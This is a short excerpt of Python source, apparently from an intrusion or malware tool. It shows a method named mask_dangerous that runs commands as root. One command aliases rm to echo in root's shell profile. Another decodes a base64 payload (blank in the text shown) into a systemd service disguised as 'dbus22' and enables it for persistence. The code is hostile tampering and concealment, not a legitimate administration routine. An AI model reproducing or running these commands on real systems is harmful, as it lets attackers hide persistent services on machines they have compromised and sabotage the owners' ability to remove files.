...
class CyberDevice:
    ...
    def mask_dangerous(self):
        ...
        self.execute("echo 'echo \"alias rm=echo\" >> /root/.bashrc' | sudo bash")

        self.execute("echo 'echo  | base64 -d > /etc/systemd/system/dbus22.service && systemctl daemon-reload && systemctl enable dbus22.service && systemctl restart dbus22.service' | sudo bash")
        # echo 'echo  | base64 -d > /etc/systemd/system/dbus22.service && systemctl daemon-reload && systemctl enable dbus22.service && systemctl restart dbus22.service' | sudo bash
